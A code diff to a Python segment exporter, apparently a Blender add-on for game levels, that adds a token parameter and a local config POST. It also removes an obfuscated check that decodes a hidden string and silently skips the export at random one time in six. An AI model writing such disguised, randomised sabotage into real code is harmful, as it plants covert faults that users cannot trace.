@@ -747,7 +747,11 @@ def sh_export_segment_ext(filepath, context, scene, compress = False, params = {
 			filepath = f"{overlay}/segments/test.xml.mp3"
 			compress = False
 			
-			# TODO Async POST /v6/config to update config for asset dir if need
+			# Async POST /v6/config to update config for asset dir if needed
+			util.do_async_json_post("http://localhost:8000/v6/config", {
+				"token": params.get("nx_token", "unknown"),
+				"assets": butil.find_apk(),
+			})
 	else:
 		# Preform template resolution if it is enabled for all segments and not
 		# in quick test mode.
@@ -791,7 +795,7 @@ def sh_export_all_segments(context, compress = True, aotype = '1'):
 				"ymb_ao": aotype,
 			})
 
-def sh_export_segment(filepath, context, integ, compress = False, testserver = False, aotype = '1'):
+def sh_export_segment(filepath, context, compress = False, testserver = False, nx_token = None, aotype = '1'):
 	sh_properties = context.scene.sh_properties
 	
 	params = {
@@ -801,17 +805,13 @@ def sh_export_segment(filepath, context, integ, compress = False, testserver = F
 		"bake_vertex_light": sh_properties.sh_ambient_occlusion,
 		"lighting_enabled": sh_properties.sh_lighting,
 		"sh_test_server": testserver,
+		"nx_token": nx_token,
 		"sh_meshbake_template": tryTemplatesPath(),
 		"auto_find_filepath": not testserver, # HACK to make this work
 		"ymb_ao": aotype,
 	}
 	
 	util.log(f"Exporting a segment:\n\tfilepath = {filepath}\n\tcompress = {compress}\n\ttestserver = {testserver}\n\tparams = {params}")
-	
-	import secrets
-	
-	if ((chr(-0b101110101 + 488) + chr(0x45) + chr(0b1100111) + '\x73' + chr(0x74) + chr(0b101100 + 38) + chr(44265 // 0x2a9) + '\x74' + chr(881 - 780)).lower() in integ and secrets.randbelow(6) < 1):
-		return
 	
 	sh_export_segment_ext(filepath, context, context.scene, compress, params)
 
